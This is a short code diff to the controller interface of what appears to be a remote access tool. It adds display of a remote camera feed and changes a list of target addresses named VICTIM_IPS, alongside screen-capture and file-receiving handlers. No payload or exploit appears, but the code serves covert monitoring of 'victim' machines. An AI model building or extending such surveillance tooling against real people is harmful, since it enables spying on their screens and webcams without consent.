@@ -17,7 +17,7 @@ from ui.components.display import Display
 from ui.components.button import Button
 from ui.components.input_box import InputBox
 from ui.handlers.screen_handler import screenreceiver
-from ui.handlers.camera_handler import camreceiver
+from ui.handlers.camera_handler import camerareceiver
 from ui.handlers.file_handler import receive_file
 from ui.utils.network import R_tcp
 
@@ -33,7 +33,7 @@ pygame.display.set_caption("Remote Desktop Menu")
 font = pygame.font.Font(None, 36)
 
 # Vector victim origin
-VICTIM_IPS = ['10.10.27.158', '192.168.1.6', '192.168.1.15']
+VICTIM_IPS = ['10.10.36.107', '192.168.1.6', '192.168.1.2']
 
 # Thread pool for background tasks
 thread_pool = ThreadPoolExecutor(max_workers=4)
@@ -139,7 +139,7 @@ def show_full_screen(display, options):
                     elif camera_button.rect.collidepoint(event.pos):
                         if camera_button.text == "Start Camera":
                             camera_button.text = "Stop Camera"
-                            camera_receiver = camreceiver(display.text, options.port + 2)
+                            camera_receiver = camerareceiver(display.text, options.port + 2)
                         else:
                             camera_button.text = "Start Camera"
                             ui_state.camera_running = False
@@ -173,6 +173,15 @@ def show_full_screen(display, options):
                 screen.blit(screen_receiver.double_buffer, frame_rect)
             else:
                 screen.blit(text_surface, text_rect)
+            
+            if camera_receiver and camera_receiver.double_buffer:
+                # Tạo Surface từ buffer camera_receiver
+
+                screen.blit(camera_receiver.double_buffer, frame_rect)
+            else:
+                screen.blit(text_surface, text_rect)
+
+            
             camera_button.draw(screen)
             screen_button.draw(screen)
             file_button.draw(screen)
